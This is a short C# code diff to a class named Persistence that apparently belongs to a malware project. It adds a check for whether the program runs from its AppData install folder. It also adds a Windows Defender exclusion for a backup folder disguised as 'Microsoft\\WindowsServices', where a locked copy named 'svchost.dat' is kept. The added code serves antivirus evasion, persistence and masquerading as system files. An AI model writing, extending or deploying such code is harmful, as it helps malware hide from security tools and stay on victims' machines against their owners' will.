@@ -142,6 +142,18 @@ internal static partial class Persistence
         return null;
     }
 
+    public static bool IsRunningFromInstallPath(string name)
+    {
+        try
+        {
+            var selfPath = Environment.ProcessPath;
+            if (string.IsNullOrEmpty(selfPath)) return false;
+            var installDir = Path.Combine(GetUserAppData(), name);
+            return selfPath.StartsWith(installDir, StringComparison.OrdinalIgnoreCase);
+        }
+        catch { return false; }
+    }
+
     public static string? GetInstalledPath(string name)
     {
         try
@@ -435,6 +447,7 @@ internal static partial class Persistence
         var backupDir    = Path.Combine(localAppData, "Microsoft", "WindowsServices");
         var backupExe    = Path.Combine(backupDir, "svchost.dat");
 
+        Protection.AddDefenderExclusion(backupDir);
         CreateBackup(installExe, backupDir, backupExe);
         _exeLock    = LockFile(installExe);
         _backupLock = LockFile(backupExe);
